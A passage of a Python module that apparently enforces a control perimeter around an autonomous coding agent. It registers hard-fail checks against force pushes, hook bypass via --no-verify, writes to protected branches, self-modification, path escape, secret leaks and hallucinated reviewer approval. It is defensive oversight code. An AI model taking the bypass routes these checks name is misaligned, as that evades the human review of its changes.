    inputs are missing, and a new check naming `diff_text` is covered without
    touching this function.
    """
    return any(field_name in reason for field_name in absent)


# Plan ARIA-V9.0-D — hard-fail checks (15 at V9.5; Plan 031 §031e added the
# 16th, expert_consensus_evidence_verified). The check IMPLEMENTATIONS live as
# separate functions above (or are wired by V9.6 auto_merge runner / V9.4
# plan_synthesizer / V9.3 envelope minter / 031e expert_review_gate). This
# registry pins the NAMES + descriptions + finding closure mapping so the
# orchestrator's pre-PR-open loop has a single iterable checklist + invariant
# test pins the count.
HARD_FAIL_CHECKS: tuple[HardFailCheck, ...] = (
    HardFailCheck(
        name="no_force_push",
        description="git push refspec-aware: only refs/heads/aria-impl-<hex16>",
        closes_findings=("sec-CRIT-002",),
        check=_check_no_force_push,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="no_no_verify",
        description="--no-verify + core.hooksPath denial",
        closes_findings=("sec-CRIT-002",),
        check=_check_no_no_verify,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="no_main_branch_write",
        description="direct push + gh api PATCH/PUT/DELETE on branches/protections",
        closes_findings=("sec-CRIT-002", "sec-CRIT-003"),
        check=_check_no_main_branch_write,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="forbidden_scope_normalized",
        description="Path.resolve() + symlink + glob match against READONLY_PATHS",
        closes_findings=("arb-HIGH-004", "ai-HIGH-006"),
        check=_check_forbidden_scope_normalized,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="kernel_self_modification_blocked_at_envelope_mint",
        description="envelope-mint refuses when affected_surfaces ∩ READONLY_PATHS ≠ ∅",
        closes_findings=("ai-CRIT-005", "arb-CRIT-005"),
        check=_check_kernel_self_modification_at_mint,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="test_gate_canonical_suite",
        description=(
            "validation_commands[] MUST include the canonical suite "
            "(nx affected --target=test, nx affected --target=lint, "
            "npm run type-check). Mutation + coverage were named in this "
            "description before the check had an implementation; neither "
            "target exists in this repository, so requiring them would "
            "make the gate unsatisfiable rather than strict. Tracked as "
            "ORPHAN-MEDIUM-436, not dropped."
        ),
        closes_findings=("ai-HIGH-008",),
        check=_check_test_gate_canonical_suite,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="secret_scan_diff_clean",
        description="verify_no_secret_in_diff BEFORE gh pr create",
        closes_findings=("ai-CRIT-004", "sec-HIGH-005"),
        check=_check_secret_scan_diff_clean,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="bash_command_allowlist",
        description="verify_bash_command_allowed at runtime tool dispatch",
        closes_findings=("ai-CRIT-002", "sec-CRIT-002"),
        check=_check_bash_command_allowlist,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="path_escape_guard",
        description="verify_no_path_escape on Edit/Write path arg resolution",
        closes_findings=("ai-HIGH-006",),
        check=_check_path_escape_guard,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="branch_tip_lock_and_recheck",
        description="branch_tip_sha captured; auto-merge re-verifies headRefOid pre-merge",
        closes_findings=("ai-HIGH-007", "sec-HIGH-002"),
        check=_not_implemented("branch_tip_lock_and_recheck"),
        gate=GATE_PRE_MERGE,
    ),
    HardFailCheck(
        name="per_file_mutual_exclusion",
        description="_validate_implementation_request rejects locked affected_surfaces",
        closes_findings=("ai-HIGH-009",),
        check=_not_implemented("per_file_mutual_exclusion"),
        gate=GATE_PRE_MERGE,
    ),
    HardFailCheck(
        name="operator_feedback_signature",
        description="plan_synthesizer rejects unsigned operator-feedback rows",
        closes_findings=("ai-HIGH-010",),
        check=_not_implemented("operator_feedback_signature"),
        gate=GATE_PRE_MERGE,
    ),
    HardFailCheck(
        name="pr_body_templating",
        description="render_pr_body() with bidi-strip + comment-ban (Tier-2)",
        closes_findings=("ai-HIGH-012", "sec-HIGH-008"),
        check=_check_pr_body_templating,
        gate=GATE_PRE_PR_OPEN,
    ),
    HardFailCheck(
        name="cycle_and_turn_budget_cap",
        description="per-cycle budget cap (budget.DEFAULT_MAX_BUDGET_USD_PER_CYCLE) + per-implementer-turn N=10 caps with reservation-reconcile",
        closes_findings=("ai-HIGH-013", "perf-CRIT-001"),
        check=_not_implemented("cycle_and_turn_budget_cap"),
        gate=GATE_PRE_MERGE,
    ),
    HardFailCheck(
        name="content_hash_recheck",
        description="implementer recomputes SHA256 of CONVERGED plan vs envelope.content_hash",
        closes_findings=("ai-MED-019",),
        check=_not_implemented("content_hash_recheck"),
        gate=GATE_PRE_MERGE,
    ),
    # Plan 031 Faz 031e — the autonomous fix's reviewer is ≥2 independent
    # topic-experts, not the operator; the gate (expert_review_gate.
    # enforce_expert_consensus_gate) requires unanimous evidence-verified
    # consensus and re-checks every reviewer's evidence_refs against the git
    # blob at base SHA, so a hallucinated approval cannot open the PR.
    HardFailCheck(
        name="expert_consensus_evidence_verified",
        description=(
            "enforce_expert_consensus_gate: >=2 independent topic-experts, "
            "unanimous satisfied, mean confidence >=0.80, every evidence_ref "
            "repo-verified at base SHA (hallucinated approval blocks + escalates)"
        ),
        closes_findings=("aria-031e-expert-consensus",),
        check=_not_implemented("expert_consensus_evidence_verified"),
        gate=GATE_PRE_MERGE,
    ),
    # Plan-coverage gate (ORPHAN-HIGH-310) — the 17th check. Enforcement
    # lives in plan_convergence._require_coverage_for_implementation
    # (request_implementation validator): a schema_version>=2 plan may not
    # enter implementation without a covered / covered_with_waivers verdict
    # from the deterministic plan-coverage witness, with waivers adjudicated
    # by the completeness critic (fail-closed to gaps on timeout).
    HardFailCheck(
        name="plan_coverage_witness_verified",
        description=(
            "_require_coverage_for_implementation: schema_version>=2 plans "
            "need a covered/covered_with_waivers coverage_computed verdict "
            "(deterministic impact closure; critic-adjudicated waivers) "
            "before implementation_requested"
        ),
        closes_findings=("ORPHAN-HIGH-310",),
        check=_not_implemented("plan_coverage_witness_verified"),
        gate=GATE_PRE_MERGE,
    ),
)


__all__ = (
    # constants
    "READONLY_PATHS",
    "ALLOWED_BASH_COMMANDS",
    "DENIED_BASH_COMMANDS",
    "FORBIDDEN_GH_API_PATHS",
    "MAX_VALIDATION_RESULT_BYTES",
    "IMMUTABLE_AGENT_FILE_HASH_REGISTRY",
    "SECRET_SCAN_PATTERNS",
    # ORPHAN-CRITICAL-428 phase A — one grammar for an ARIA branch, shared
    # by the argv allowlist and the refspec check; and the canonical
    # validation suite the test gate requires.
    "ARIA_IMPL_BRANCH_FRAGMENT",
    "CANONICAL_VALIDATION_COMMANDS",
    "CANONICAL_VALIDATION_COMMANDS_EXECUTABLE",
    "CANONICAL_VALIDATION_TIMEOUT_MS",
    # exceptions
    "SecretLeakDetected",
    "PathEscape",
    "BashAllowlistMiss",
    "BashDenylistHit",
    "CommitSignatureMismatch",
    # functions
    "verify_no_secret_in_diff",
    "verify_no_secret_in_envelope",
    "verify_commit_signature",
    "mint_unpredictable_feature_branch_name",
    "verify_no_path_escape",
    "verify_bash_command_allowed",
    # ORPHAN-CRITICAL-728 — the READONLY_PATHS subtraction the implementation
    # envelope derives its allowed_scope from, and the single-surface rule it
    # shares with the pre-PR-open perimeter check.
    "classify_declared_surface",
    "implementation_allowed_scope",
    "is_gh_api_path_forbidden",
    "SandboxUnavailable",
    "sandbox_backend",
    "wrap_bash_in_sandbox",
    "ResourceLimitsUnavailable",
    "apply_resource_limits",
    "truncate_validation_result",
    # registry
    "HardFailCheck",
    "PerimeterObservation",
    "PerimeterVerdict",
    "observe_perimeter",
    "NOT_EVALUABLE_AT_THIS_STAGE",
    "HARD_FAIL_CHECKS",
    # ORPHAN-CRITICAL-428 — the perimeter is two gates; the stage names and
    # the set of valid gates are public contract because callers select a
    # stage and an unknown gate must raise rather than select nothing.
    "GATE_PRE_PR_OPEN",
    "GATE_PRE_MERGE",
    "HARD_FAIL_GATES",
)
